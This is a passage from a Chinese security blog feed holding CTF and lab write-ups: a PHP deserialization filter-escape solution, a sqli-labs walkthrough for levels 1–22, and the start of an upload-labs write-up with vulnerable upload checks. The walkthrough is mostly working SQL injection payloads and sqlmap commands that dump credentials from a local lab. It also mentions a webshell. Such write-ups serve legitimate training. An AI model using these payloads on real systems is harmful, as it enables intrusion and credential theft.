class="language-none">"a:2:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mbGxsbGxsYWc=";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意到这里的s:7:””之所以为空，是因为构造的键flagphp都是会被过滤的，所以显示为空，这样就能吃掉一部分值了，然后将剩下得值充当另一个对象逃逸出去~~</p><p>然后看这题</p><p>如果<code>f=show_image</code>，会执行反序列化</p><pre class="line-numbers language-none"><code class="language-none">$userinfo = unserialize($serialize_info);echo file_get_contents(base64_decode($userinfo['img']));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们可以利用反序列化执行<code>d0g3_f1ag.php</code>，先对<code>d0g3_f1ag.php</code>base64加密，得到<code>ZDBnM19mMWFnLnBocA==</code></p><p>构造payload，因为会过滤<code>php</code>，<code>flag</code>，<code>php5</code>，<code>php4</code>，<code>fl1g</code></p><pre class="line-numbers language-none"><code class="language-none">$filter_arr = array('php','flag','php5','php4','fl1g');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对</p><pre class="line-numbers language-none"><code class="language-none">_SESSION[flagflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以这样子构造</p><p><img src="https://anwar.oss-cn-shenzhen.aliyuncs.com/picgo/image-20210117062536421.png" alt="image-20210117062536421"></p><p>提交之后发现一片空白，查看源码发现有个提示</p><p><img src="https://anwar.oss-cn-shenzhen.aliyuncs.com/picgo/image-20210117062643391.png" alt="image-20210117062643391"></p><p>flag就在这里面了</p><p>还是同样的方法，对<code>/d0g3_fllllllag</code>base64加密，得<code>L2QwZzNfZmxsbGxsbGFn</code>，只需要把原来的base64换成这个就行了</p><p><img src="https://anwar.oss-cn-shenzhen.aliyuncs.com/picgo/image-20210117062900840.png" alt="image-20210117062900840"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs做题记录</title>
      <link href="2020/12/17/sqli-labs-zuo-ti-ji-lu/"/>
      <url>2020/12/17/sqli-labs-zuo-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p><strong>手动</strong></p><p>先判断注入类型。</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=1 --+http://127.0.0.1/sqli-labs/Less-1/?id=1' and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第一种传入网站显示正常，第二种传入网站显示不正常。可以看出语句已经被执行。因此说明是单引号类型注入。 先判断字段数。依次递增order by 后面的数值。</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 1 --+http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 2 --+http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 3 --+http://127.0.0.1/sqli-labs/Less-1/?id=1' order by 4 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>发现3时不报错,而4时报错，所以字段数是3。<br>接下来用联合查询判断显示位。首先要让id变成一个不存在的值以便显示出来的值都是union语句执行的结果。我使用的是-1。</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201215103636465.png" alt="image-20201215103636465"></p><p>显示位是2,3。所以可以在 2,3位置进行sql注入</p><p>这里涉及到几个函数</p><p><a href="https://zhuanlan.zhihu.com/p/94594406">mysql中concat()，concat_ws()，group_concat()的用法</a></p><pre class="line-numbers language-none"><code class="language-none">爆库:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,database() --+爆表:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+爆字段:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+爆值:http://127.0.0.1/sqli-labs/Less-1/?id=100' union select 1,2,group_concat(username,0x3a,password,0x3c2f62723e) from security.users --+ 加个换行符要好看点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201215104801864.png" alt="image-20201215104801864"></p><p><strong>sqlmap</strong></p><p>为了方便截图,后面加个输出参数为0</p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql –batch –v 0sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql --dbs --batch -v 0 #查有哪些模式sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security --tables  --batch -v 0 #查表sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users --columns  --batch -v 0 #查字段sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0 #看用户名和密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果:</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201215111527173.png" alt="image-20201215111527173"></p><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p> <strong>手动</strong></p><p>第二个和第一个差不多,但是是数值型注入,把1后面的引号去掉就行</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=1 --+http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来和less1一样</p><p><strong>sqlmap</strong></p><p>套less1的语句就行</p><h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p> <strong>手动</strong></p><p>先传id=1 好家伙</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201215112709298.png" alt="image-20201215112709298"></p><p>要构造闭合,上一篇slq注入的文章写过</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-3/?id=1') and 1=1 --+http://127.0.0.1/sqli-labs/Less-3/?id=1') and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来的和上面一样操作</p><p> <strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-3/?id=1') --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一个还是可以</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201215114121245.png" alt="image-20201215114121245"></p><h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p><strong>手动</strong></p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201215130603268.png" alt="image-20201215130603268"></p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-4/?id=1"和上面的类似,只需要闭合"")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来和上面的操作一样</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http://127.0.0.1/sqli-labs/Less-4/?id=1 --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>前面四题其实差不多,只是闭合符号的区别</strong></p><h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>这题没有显位,所以判断是布尔盲注,时间盲注,或者是报错注入</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201215131113848.png" alt="image-20201215131113848"></p><p><strong>手动</strong></p><p>通过一个left函数来判断,一个一个去试太费时间了,可以用burp suite爆破</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-5/?id=1' and left((select database()),2)="se" --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201215203250924.png" alt="image-20201215203250924"></p><p>后面的就和前面差不多了</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">看下有哪些数据库python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql --dbs --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201216155809304.png" alt="image-20201216155809304"></p><pre class="line-numbers language-none"><code class="language-none">查看security数据库的表python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security --tables --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201216160004973.png" alt="image-20201216160004973"></p><pre class="line-numbers language-none"><code class="language-none">查看字段python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security -T users --columns --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201216160201804.png" alt="image-20201216160201804"></p><pre class="line-numbers language-none"><code class="language-none">查看用户名和密码 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201216160334348.png" alt="image-20201216160334348"></p><h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p>这题和上面less5差不多，就是闭合符号不一样，把单引号改成双引号就可以了</p><h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><strong>手动</strong></p><p>先确定是如何闭合的，如下</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-7?id=1')) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201216192553184.png" alt="image-20201216192553184"></p><p>根据提示，目测是对数据库文件进行操作，上传一个一句话木马试试(因为我是装在自己的电脑上的所以知道绝对路径)</p><p><strong>sqlmap</strong></p><p>布尔盲注直接跑</p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-7/?id=1 --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p><strong>手动</strong></p><p>这题也是布尔盲注，payload和第五题差不多，可以用left函数或ASCII函数来一个一个来判断，还是用sqlmap舒服🤣</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u 'http://127.0.0.1/sqli-labs/Less-8/?id=1' --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>时间注入</p><p><strong>手动</strong></p><p>又是一个一个去试，可以采用ASCII函数采用二分法来找到正确的字符，然后配合sleep(5)函数来构造</p><p><strong>sqlmap</strong></p><p>把technique改成T来试试</p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u 'http://127.0.0.1/sqli-labs/Less-9/?id=1' --technique T --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p><strong>手动</strong></p><p>还是时间注入,只是和上一题的拼接方式不一样</p><p>先构造闭合，试了一下下面几个，马上就显示you are in了，说明没有被执行</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-10/?id=1' and sleep(5)--+http://127.0.0.1/sqli-labs/Less-10/?id=1') and sleep(5)--+http://127.0.0.1/sqli-labs/Less-10/?id=1')) and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最终正确的闭合是</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/sqli-labs/Less-10/?id=1" and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就和上题less9一样操作了</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-10/?id=1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201216222531930.png" alt="image-20201216222531930"></p><p>从这以后就全部变成post注入了</p><p><strong>手动</strong></p><pre class="line-numbers language-none"><code class="language-none">username部分username=admin' union select 1,database()# 把username换成admin,后面的操作就和第一题差不多了username=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#username=1' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'#username=1' union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#password可以随便输,因为后台已经注释掉了SELECT username, password FROM users WHERE username='1' union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#' and password='$passwd' LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201216232558079.png" alt="image-20201216232558079"></p><p><strong>sqlmap</strong></p><p>先buspsuite抓包，看看data数据的格式，然后再拿sqlmap跑就可以了</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201216235540077.png" alt="image-20201216235540077"></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-11/ --data "uname=admin &amp;passwd=admin &amp;submit=Submit" --dbms mysql -D security -T users --threads 5 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h2><p>不断尝试几次时候发现，这题和less11一模一样，只是闭合方式变了，变成了”）</p><h2 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h2><p><strong>手动</strong></p><p>发现用‘)闭合之后没有显示位，那就试试报错注入</p><p>尝试使用extractvalue()函数</p><p>直接extractvalue(1，database())好像有点问题，查略一番资料后发现加个concat就正常了</p><pre class="line-numbers language-none"><code class="language-none">username=1') and extractvalue(1,concat(1,database()))#username=1') and extractvalue(1,concat(1,(select (table_name) from information_schema.tables where table_schema=database() limit 0,1)))#username=1') and extractvalue(1,concat(1,(select (column_name) from information_schema.columns where table_name='users' limit 0,1)))#username=1') and extractvalue(1,concat(1,(select concat(username,0x3a,password) from security.users limit 1,1)))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201217083037989.png" alt="image-20201217083037989"></p><p><strong>sqlmap</strong></p><p>因为之前已经抓过包,post请求应该是一样的,所以和命令和第十一题是一样</p><h2 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h2><p>和上一题一样，只是闭合变成了“</p><h2 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h2><p><strong>手动</strong></p><p>这题不能用报错注入，试试其他的吧</p><p>先试试数据库的长度</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201217093502896.png" alt="image-20201217093502896"></p><p>依旧使用left函数来判断</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201217095623040.png" alt="image-20201217095623040"></p><p>然后就是一个一个去试啦，也可以借助一些脚本，或者是burpsuite</p><p><strong>sqlmap</strong></p><p>然它自己去测吧，从结果来看，可以指定使用布尔盲注或者是时间盲注，这样子跑的会快一些</p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data "uname=admin &amp;passwd=admin &amp;submit=Submit" --dbms mysql -D security -T users --threads 5 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h2><p>和15题一样，只是闭合变成了”）</p><p>sqlmap的话用上面的跑不出了，在网上查到sqlmap默认的输出等级是1，这里把输出等级调高一点就好了</p><h2 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h2><p><strong>手动</strong></p><p>这一关开始看着有点懵，提示要重置密码</p><p>查看post内容，发现是在passwd处</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201217105225854.png" alt="image-20201217105225854"></p><p>我的理解是接收到用户POST提交的uname和passwd后，根据uname查询数据库的username和password，若uname存在则用passwd替换password，若不存在则显示slap1.jpg</p><p>所以注入的时候要在这里，用户名的话就用admin吧</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201217104135668.png" alt="image-20201217104135668"></p><p>需要用到的是updatexml函数</p><pre class="line-numbers language-none"><code class="language-none">uname=admin&amp;passwd=123123' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1)),1)#&amp;sumit=Submit接下来的和前面差不多<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h2><p><strong>手动</strong></p><p>登录失败只会显示ip地址,登录成功会显示user agent</p><p>随后发现username和password都被转义了,构造不了闭合条件</p><p>猜测可能可以通过user agent来注入,看了下源码,确实如此</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201217205929858.png" alt="image-20201217205929858"></p><p>谷歌的hackbar不知道为什么有点问题</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201217210659356.png" alt="image-20201217210659356"></p><p>直接用burpsuite试试</p><p>payload为</p><pre class="line-numbers language-none"><code class="language-none">' or updatexml(1,concat(0x7e,(database())),1) or '1' = '1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到已经爆出来了,接下来就是常规操作啦</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201217211008781.png" alt="image-20201217211008781"></p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h2><p><strong>手动</strong></p><p>输入正确会显示Referer,错误没有显示,这题基本上就是Referer这里存在注入</p><p>和18题一样,只是注入点不一样,用上一题的payload就行了</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201217213027022.png" alt="image-20201217213027022"></p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level=4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h2><p><strong>手动</strong></p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201217213314948.png" alt="image-20201217213314948"></p><p>基本上就是cookie注入了</p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201217220045913.png" alt="image-20201217220045913"></p><p><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/image-20201217220110130.png" alt="image-20201217220110130"></p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-20/" --cookie="uname=admin*"--dbms=MySQL --random-agent --flush-session --technique=B -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h2><p><strong>手动</strong></p><p>这题和上一题一样,就是把payload用base64编码了</p><p>把上一题的payload base64编码一下就是这题的payload了</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -r 抓包保存的文件路径 --cookie uname=YWRtaW4%3D --tech E --dbms mysql --tamper base64encode.py --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less22"><a href="#less22" class="headerlink" title="less22"></a>less22</h2><p><strong>手动</strong></p><p>和上一题的一样,就是把闭合方式改成了双引号</p><p><strong>sqlmap</strong></p><pre class="line-numbers language-none"><code class="language-none">sqlmap.py -r 抓包保存的文件路径 --cookie uname=YWRtaW4= --tech E --dbms mysql --tamper base64encode.py --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="2020/11/29/upload-labs/"/>
      <url>2020/11/29/upload-labs/</url>
      
        <content type="html"><![CDATA[<h2 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h2><h3 id="pass-01-js-audit"><a href="#pass-01-js-audit" class="headerlink" title="pass-01 js audit"></a>pass-01 js audit</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token operator">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword type-declaration">null</span> <span class="token operator">||</span> <span class="token class-name">file</span> <span class="token operator">==</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//定义允许上传的文件类型</span>    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string double-quoted-string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>    <span class="token comment">//提取上传文件的类型</span>    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token operator">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token operator">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//判断上传文件类型是否允许上传</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token operator">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string double-quoted-string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string double-quoted-string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接在js上添加php或者禁用js或者burp改包就好了</p><h3 id="Pass-02-只验证Content-type"><a href="#Pass-02-只验证Content-type" class="headerlink" title="Pass-02 只验证Content-type"></a>Pass-02 只验证Content-type</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span 